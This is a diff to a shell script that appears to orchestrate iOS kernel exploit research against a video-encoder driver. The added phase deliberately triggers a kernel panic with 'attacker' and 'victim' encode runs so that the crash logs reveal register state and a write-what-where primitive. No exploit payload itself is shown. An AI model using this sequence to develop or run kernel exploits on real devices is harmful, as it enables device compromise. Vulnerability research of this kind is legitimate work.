@@ -110,10 +110,28 @@ read -r
 run_probe com.research.aveiosurfspray spray_and_encode
 
 echo ""
+echo "PHASE 10: Stack Overflow Panic (GRAND-CALLER DISCOVERY)"
+echo "========================================================"
+echo ">>> This runs the dual mode: 360 encodes (attacker) + 1 encode (victim)"
+echo ">>> WILL cause a kernel panic — this is EXPECTED and DESIRED."
+echo ">>> The panic log reveals the grand-caller PC and register state,"
+echo ">>> which tells us the actual write-what-where primitive."
+echo ">>> REQUIRES: crash_test survived past 197 (Scenario B confirmed)"
+echo ">>> After panic + reboot, retrieve logs with:"
+echo ">>>   pymobiledevice3 crash pull \$UDID ./panic_logs/"
+echo ">>> Press Enter to trigger, or Ctrl+C to stop..."
+read -r
+run_probe com.research.avefullchain dual
+
+echo ""
 echo "============================================"
 echo "  Test Sequence Complete"
 echo "  Time: $(date)"
 echo "============================================"
 echo ""
-echo "Next: Collect log files from device ~/Documents/"
-echo "  pymobiledevice3 developer dvt pull $UDID ~/Documents/ ./device_logs/"
+echo "Next steps:"
+echo "  1. Collect app log files from device:"
+echo "     pymobiledevice3 developer dvt pull $UDID ~/Documents/ ./device_logs/"
+echo "  2. After any panic + reboot, collect panic logs:"
+echo "     pymobiledevice3 crash pull $UDID ./panic_logs/"
+echo "  3. Look for 'panic-full' files — they contain register state at crash"
